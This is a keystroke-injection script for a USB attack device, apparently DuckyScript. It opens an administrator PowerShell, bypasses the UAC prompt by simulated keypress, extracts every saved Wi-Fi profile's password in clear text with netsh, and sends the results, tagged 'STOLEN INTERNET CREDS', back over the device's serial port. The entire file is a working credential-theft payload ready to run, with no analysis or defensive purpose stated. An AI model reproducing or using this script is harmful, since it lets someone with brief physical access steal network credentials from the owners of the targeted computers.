REM Set default delay
DEFAULT_DELAY 200

REM Swap keyboard-layout
GUI r
STRING PowerShell Set/WinUserLanguageList /LanguageList en/US, nb /Force
ENTER

REM Open powershell as administrator
GUI r
STRING powershell
CTRL SHIFT ENTER
DELAY 1000
ALT y

REM Extract wifipasswords and save to duck
STRING $n = "STOLEN INTERNET CREDS FROM:";$n += whoami;$n += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String; $s=(Get-WmiObject -Class Win32_PnPEntity -Namespace 'root\CIMV2' -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption; $com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value;$port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;$port.open();ForEach ($l in $($n -split "`r`n")){$port.WriteLine("SerialEXFIL:$l");}; $port.Close();exit;
ENTER

REM Swap back keyboard-layout
DELAY 4000
REM Swap keyboard-layout
GUI SPACE